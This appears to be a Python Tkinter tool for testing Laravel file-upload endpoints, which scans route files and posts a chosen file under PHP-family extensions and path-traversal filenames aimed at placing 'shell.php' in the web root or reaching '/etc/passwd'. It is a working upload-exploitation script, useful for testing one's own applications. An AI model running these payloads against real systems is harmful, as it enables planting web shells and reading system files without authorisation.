import os
import tkinter as tk
from tkinter import ttk, filedialog, messagebox, Text, Scrollbar, Listbox
import requests
import threading
import subprocess
import time
from urllib.parse import urljoin
import webbrowser
import re

class LaravelUploadTester:
    def __init__(self, root):
        self.root = root
        self.root.title("Laravel File Upload Tester (Extension + Traversal)")
        self.root.geometry("900x700")
        self.root.configure(padx=10, pady=10)

        self.process = None
        self.server_url = tk.StringVar(value="http://127.0.0.1:8000")
        self.upload_endpoint = tk.StringVar(value="/upload")  # Change as needed
        self.local_path = tk.StringVar()
        self.selected_file = None
        self.found_endpoints = []

        self.setup_ui()

        # Payloads
        self.extensions = [
            "php", "php3", "php4", "php5", "phtml", "phpt", "phar",
            "jpg", "png", "gif", "jpeg", "pdf", "txt", "html"
        ]
        self.traversal_payloads = [
            "../../../../../var/www/html/shell.php",
            "..%2F..%2F..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Fshell.php",
            "..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        ]

    def setup_ui(self):
        # Create notebook for tabs
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill="both", expand=True, padx=10, pady=10)

        # Testing tab
        self.testing_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.testing_tab, text="Testing")

        # === Mode Selection ===
        mode_frame = ttk.LabelFrame(self.testing_tab, text="Test Mode")
        mode_frame.pack(fill="x", pady=5)

        self.mode = tk.StringVar(value="remote")
        ttk.Radiobutton(mode_frame, text="Remote (URL)", variable=self.mode, value="remote", command=self.toggle_mode).pack(side="left", padx=10)
        ttk.Radiobutton(mode_frame, text="Local (Folder)", variable=self.mode, value="local", command=self.toggle_mode).pack(side="left", padx=10)

        # === Remote Config ===
        self.remote_frame = ttk.LabelFrame(self.testing_tab, text="Remote Laravel App")
        self.remote_frame.pack(fill="x", pady=5)

        ttk.Label(self.remote_frame, text="Base URL:").grid(row=0, column=0, sticky="w", padx=5, pady=2)
        ttk.Entry(self.remote_frame, textvariable=self.server_url, width=50).grid(row=0, column=1, padx=5, pady=2)

        ttk.Label(self.remote_frame, text="Upload Endpoint:").grid(row=1, column=0, sticky="w", padx=5, pady=2)
        ttk.Entry(self.remote_frame, textvariable=self.upload_endpoint, width=50).grid(row=1, column=1, padx=5, pady=2)

        # === Local Config ===
        self.local_frame = ttk.LabelFrame(self.testing_tab, text="Local Laravel App")
        self.local_frame.pack(fill="x", pady=5)

        ttk.Label(self.local_frame, text="Project Folder:").grid(row=0, column=0, sticky="w", padx=5, pady=2)
        ttk.Entry(self.local_frame, textvariable=self.local_path, width=60).grid(row=0, column=1, padx=5, pady=2)
        ttk.Button(self.local_frame, text="Browse", command=self.browse_folder).grid(row=0, column=2, padx=5)

        self.start_btn = ttk.Button(self.local_frame, text="Start Server", command=self.start_local_server)
        self.start_btn.grid(row=1, column=1, pady=5)
        self.stop_btn = ttk.Button(self.local_frame, text="Stop Server", command=self.stop_local_server, state="disabled")
        self.stop_btn.grid(row=1, column=2, pady=5)

        # === File Selection ===
        file_frame = ttk.LabelFrame(self.testing_tab, text="File to Upload")
        file_frame.pack(fill="x", pady=5)

        self.file_label = ttk.Label(file_frame, text="No file selected")
        self.file_label.pack(side="left", padx=10, fill="x", expand=True)

        ttk.Button(file_frame, text="Choose File", command=self.choose_file).pack(side="right", padx=10)

        # === Test Options ===
        opts_frame = ttk.LabelFrame(self.testing_tab, text="Test Options")
        opts_frame.pack(fill="x", pady=5)

        ttk.Label(opts_frame, text="Test Type:").grid(row=0, column=0, sticky="w", padx=5)
        self.test_type = tk.StringVar(value="extension")
        ttk.Radiobutton(opts_frame, text="Extension Bypass", variable=self.test_type, value="extension").grid(row=0, column=1, sticky="w")
        ttk.Radiobutton(opts_frame, text="Path Traversal", variable=self.test_type, value="traversal").grid(row=0, column=2, sticky="w")

        # === Results ===
        result_frame = ttk.LabelFrame(self.testing_tab, text="Results")
        result_frame.pack(fill="both", expand=True, pady=5)

        self.result_text = Text(result_frame, wrap="word", height=15)
        scrollbar = Scrollbar(result_frame, command=self.result_text.yview)
        self.result_text.configure(yscrollcommand=scrollbar.set)
        self.result_text.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")

        # === Start Button ===
        ttk.Button(self.testing_tab, text="Start Testing", command=self.start_testing).pack(pady=10)

        # Upload Routes tab
        self.routes_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.routes_tab, text="Upload Routes")

        routes_frame = ttk.LabelFrame(self.routes_tab, text="Discovered Upload Endpoints")
        routes_frame.pack(fill="both", expand=True, padx=10, pady=10)

        self.routes_listbox = Listbox(routes_frame)
        routes_scrollbar = Scrollbar(routes_frame, command=self.routes_listbox.yview)
        self.routes_listbox.configure(yscrollcommand=routes_scrollbar.set)
        self.routes_listbox.pack(side="left", fill="both", expand=True)
        routes_scrollbar.pack(side="right", fill="y")

        ttk.Button(routes_frame, text="Use Selected Endpoint", command=self.use_selected_endpoint).pack(pady=5)

        self.toggle_mode()

    def toggle_mode(self):
        if self.mode.get() == "remote":
            self.remote_frame.pack(fill="x", pady=5)
            self.local_frame.pack_forget()
        else:
            self.remote_frame.pack_forget()
            self.local_frame.pack(fill="x", pady=5)

    def scan_upload_endpoints(self):
        path = self.local_path.get()
        if not path:
            return
        routes_files = ['routes/web.php', 'routes/api.php']
        endpoints = []
        for rf in routes_files:
            rf_path = os.path.join(path, rf)
            if os.path.exists(rf_path):
                with open(rf_path, 'r') as f:
                    content = f.read()
                    # Find Route::post or Route::any lines with upload-related keywords
                    matches = re.findall(r"Route::(?:post|any)\(['\"]([^'\"]*?(?:upload|file|media|document|image|attachment)[^'\"]*?)['\"]", content, re.IGNORECASE)
                    endpoints.extend(matches)
        self.found_endpoints = endpoints
        self.routes_listbox.delete(0, tk.END)
        for ep in endpoints:
            self.routes_listbox.insert(tk.END, ep)
        if endpoints:
            self.upload_endpoint.set(endpoints[0])  # set first one
            self.log(f"Found upload endpoints: {', '.join(endpoints)}")
        else:
            self.log("No upload endpoints found automatically.")

    def browse_folder(self):
        folder = filedialog.askdirectory()
        if folder:
            self.local_path.set(folder)
            self.scan_upload_endpoints()

    def choose_file(self):
        file = filedialog.askopenfilename()
        if file:
            self.selected_file = file
            self.file_label.config(text=os.path.basename(file))

    def start_local_server(self):
        path = self.local_path.get()
        if not path or not os.path.exists(os.path.join(path, "artisan")):
            messagebox.showerror("Error", "Invalid Laravel project folder (missing artisan)")
            return

        if self.process:
            messagebox.showwarning("Warning", "Server already running")
            return

        def run_server():
            try:
                cmd = ["php", "artisan", "serve", "--port=8000"]
                self.process = subprocess.Popen(
                    cmd, cwd=path, stdout=subprocess.PIPE, stderr=subprocess.PIPE
                )
                self.root.after(100, self.check_server)
            except Exception as e:
                self.log(f"Failed to start server: {e}")

        threading.Thread(target=run_server, daemon=True).start()
        self.start_btn.config(state="disabled")
        self.stop_btn.config(state="normal")
        self.log("Starting Laravel server...")

    def check_server(self):
        try:
            resp = requests.get("http://127.0.0.1:8000", timeout=2)
            if resp.status_code == 200:
                self.log("Server is up!")
            else:
                self.root.after(1000, self.check_server)
        except:
            self.root.after(1000, self.check_server)

    def stop_local_server(self):
        if self.process:
            self.process.terminate()
            self.process = None
        self.start_btn.config(state="normal")
        self.stop_btn.config(state="disabled")
        self.log("Server stopped.")

    def start_testing(self):
        if not self.selected_file:
            messagebox.showerror("Error", "Please select a file")
            return

        if self.mode.get() == "local" and not self.process:
            messagebox.showerror("Error", "Please start the local server first")
            return

        self.result_text.delete(1.0, tk.END)
        threading.Thread(target=self.run_tests, daemon=True).start()

    def run_tests(self):
        base_url = self.server_url.get().rstrip("/")
        self.log(f"File: {os.path.basename(self.selected_file)}")
        self.log("-" * 60)

        if self.mode.get() == "local" and self.found_endpoints:
            for endpoint in self.found_endpoints:
                url = urljoin(base_url, endpoint)
                self.log(f"Testing upload endpoint: {url}")
                self.log("-" * 40)
                if self.test_type.get() == "extension":
                    self.test_extensions(url)
                else:
                    self.test_traversal(url)
                self.log("")  # Add space between endpoints
        else:
            endpoint = self.upload_endpoint.get()
            url = urljoin(base_url, endpoint)
            self.log(f"Testing upload endpoint: {url}")
            self.log("-" * 40)
            if self.test_type.get() == "extension":
                self.test_extensions(url)
            else:
                self.test_traversal(url)

    def test_extensions(self, url):
        with open(self.selected_file, "rb") as f:
            original_data = f.read()

        for ext in self.extensions:
            filename = f"test.{ext}"
            files = {'file': (filename, original_data, 'application/octet-stream')}
            try:
                resp = requests.post(url, files=files, timeout=10)
                self.log(f"[{resp.status_code}] {filename} → {self.extract_message(resp.text)}")
            except Exception as e:
                self.log(f"[ERROR] {filename} → {e}")

    def test_traversal(self, url):
        with open(self.selected_file, "rb") as f:
            original_data = f.read()

        for payload in self.traversal_payloads:
            files = {'file': (payload, original_data, 'application/octet-stream')}
            try:
                resp = requests.post(url, files=files, timeout=10)
                saved_name = self.extract_saved_name(resp.text)
                self.log(f"[{resp.status_code}] {payload} → {saved_name or 'No save info'}")
                if resp.status_code == 200 and ("success" in resp.text.lower() or saved_name):
                    self.log("   ⚠️ POSSIBLE TRAVERSAL SUCCESS!")
            except Exception as e:
                self.log(f"[ERROR] {payload} → {e}")

    def extract_message(self, text):
        m = re.search(r'"message":"([^"]+)"', text)
        if m:
            return m.group(1)
        return text[:100] + ("..." if len(text) > 100 else "")

    def extract_saved_name(self, text):
        m = re.search(r'"path":"([^"]+)"', text)
        if m:
            return m.group(1)
        m = re.search(r'uploaded as <strong>([^<]+)', text)
        return m.group(1) if m else None

    def use_selected_endpoint(self):
        selected = self.routes_listbox.get(tk.ACTIVE)
        if selected:
            self.upload_endpoint.set(selected)
            self.log(f"Selected endpoint: {selected}")

    def log(self, msg):
        self.result_text.insert(tk.END, msg + "\n")
        self.result_text.see(tk.END)
        self.root.update_idletasks()


if __name__ == "__main__":
    root = tk.Tk()
    app = LaravelUploadTester(root)
    root.mainloop()